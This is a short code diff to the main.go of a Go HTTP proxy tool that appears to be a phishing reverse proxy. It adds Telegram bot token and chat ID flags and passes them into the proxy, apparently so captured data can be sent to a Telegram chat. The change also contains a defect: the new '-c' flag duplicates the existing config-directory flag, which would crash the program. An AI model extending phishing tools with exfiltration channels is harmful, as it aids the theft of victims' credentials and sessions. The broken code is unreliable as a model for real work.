@@ -24,6 +24,8 @@ var debug_log = flag.Bool("debug", false, "Enable debug output")
 var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
 var cfg_dir = flag.String("c", "", "Configuration directory path")
 var version_flag = flag.Bool("v", false, "Show version")
+var telegram_token = flag.String("t", "", "Telegram bot token")
+var telegram_chat = flag.String("c", "", "Telegram chat ID")
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -44,7 +46,6 @@ func showAd() {
 }
 
 func main() {
-	log.Info("[DEBUG] Log level: %v", log.GetLevel())
 	flag.Parse()
 
 	if *version_flag == true {
@@ -171,7 +172,7 @@ func main() {
 		return
 	}
 
-	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
+	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode, *telegram_token, *telegram_chat,)
 	hp.Start()
 
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
